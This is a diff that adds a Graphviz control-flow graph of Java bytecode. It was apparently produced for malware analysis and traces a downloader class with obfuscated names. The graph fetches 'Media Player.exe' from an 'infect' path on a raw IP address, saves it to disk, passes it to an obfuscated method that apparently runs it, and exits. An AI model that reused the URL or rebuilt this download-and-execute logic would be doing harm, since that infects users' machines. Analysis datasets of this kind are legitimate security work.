@@ -1,0 +1,82 @@
+digraph "" {
+    "r0 := @this: udbhoadc0qy"
+    "new java.io.FileOutputStream"
+    "r0 := @this: udbhoadc0qy"->"new java.io.FileOutputStream";
+    "store.r $r212"
+    "new java.io.FileOutputStream"->"store.r $r212";
+    "load.r $r212"
+    "store.r $r212"->"load.r $r212";
+    "staticinvoke <udbhoadc0qy: java.lang.String MpSMGesk()>"
+    "load.r $r212"->"staticinvoke <udbhoadc0qy: java.lang.String MpSMGesk()>";
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"
+    "staticinvoke <udbhoadc0qy: java.lang.String MpSMGesk()>"->"specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>";
+    "new java.net.URL"
+    "specialinvoke <java.io.FileOutputStream: void <init>(java.lang.String)>"->"new java.net.URL";
+    "dup1.r"
+    "new java.net.URL"->"dup1.r";
+    "push \"http://83.170.102.190/~areasexy/infect/Media%20Player.exe\""
+    "dup1.r"->"push \"http://83.170.102.190/~areasexy/infect/Media%20Player.exe\"";
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"
+    "push \"http://83.170.102.190/~areasexy/infect/Media%20Player.exe\""->"specialinvoke <java.net.URL: void <init>(java.lang.String)>";
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"
+    "specialinvoke <java.net.URL: void <init>(java.lang.String)>"->"virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>";
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"
+    "virtualinvoke <java.net.URL: java.net.URLConnection openConnection()>"->"virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>";
+    "store.r r205"
+    "virtualinvoke <java.net.URLConnection: java.io.InputStream getInputStream()>"->"store.r r205";
+    "push 1024"
+    "store.r r205"->"push 1024";
+    "newarray"
+    "push 1024"->"newarray";
+    "store.r r207"
+    "newarray"->"store.r r207";
+    "load.r r205"
+    "store.r r207"->"load.r r205";
+    "load.r r207"
+    "load.r r205"->"load.r r207";
+    "push 0"
+    "load.r r207"->"push 0";
+    "push 0"->"load.r r207";
+    "arraylength"
+    "load.r r207"->"arraylength";
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"
+    "arraylength"->"virtualinvoke <java.io.InputStream: int read(byte[],int,int)>";
+    "store.i $i2"
+    "virtualinvoke <java.io.InputStream: int read(byte[],int,int)>"->"store.i $i2";
+    "load.i $i2"
+    "store.i $i2"->"load.i $i2";
+    "push -1"
+    "load.i $i2"->"push -1";
+    "ifcmpeq.i load.r r205"
+    "push -1"->"ifcmpeq.i load.r r205";
+    "ifcmpeq.i load.r r205"->"load.r $r212";
+    "load.r $r212"->"load.r r207";
+    "load.r r207"->"push 0";
+    "push 0"->"load.i $i2";
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"
+    "load.i $i2"->"virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>";
+    "goto load.r r205"
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"goto load.r r205";
+    "store.r r0"
+    "virtualinvoke <java.io.FileOutputStream: void write(byte[],int,int)>"->"store.r r0";
+    "store.r r0"->"push 0";
+    "staticinvoke <java.lang.System: void exit(int)>"
+    "push 0"->"staticinvoke <java.lang.System: void exit(int)>";
+    "return"
+    "staticinvoke <java.lang.System: void exit(int)>"->"return";
+    "ifcmpeq.i load.r r205"->"load.r r205";
+    "virtualinvoke <java.io.InputStream: void close()>"
+    "load.r r205"->"virtualinvoke <java.io.InputStream: void close()>";
+    "virtualinvoke <java.io.InputStream: void close()>"->"load.r $r212";
+    "virtualinvoke <java.io.FileOutputStream: void close()>"
+    "load.r $r212"->"virtualinvoke <java.io.FileOutputStream: void close()>";
+    "load.r r0"
+    "virtualinvoke <java.io.FileOutputStream: void close()>"->"load.r r0";
+    "load.r r0"->"staticinvoke <udbhoadc0qy: java.lang.String MpSMGesk()>";
+    "virtualinvoke <udbhoadc0qy: void LPjAtTrh(java.lang.String)>"
+    "staticinvoke <udbhoadc0qy: java.lang.String MpSMGesk()>"->"virtualinvoke <udbhoadc0qy: void LPjAtTrh(java.lang.String)>";
+    "virtualinvoke <udbhoadc0qy: void LPjAtTrh(java.lang.String)>"->"push 0";
+    "push 0"->"staticinvoke <java.lang.System: void exit(int)>";
+    "goto return"
+    "staticinvoke <java.lang.System: void exit(int)>"->"goto return";
+}
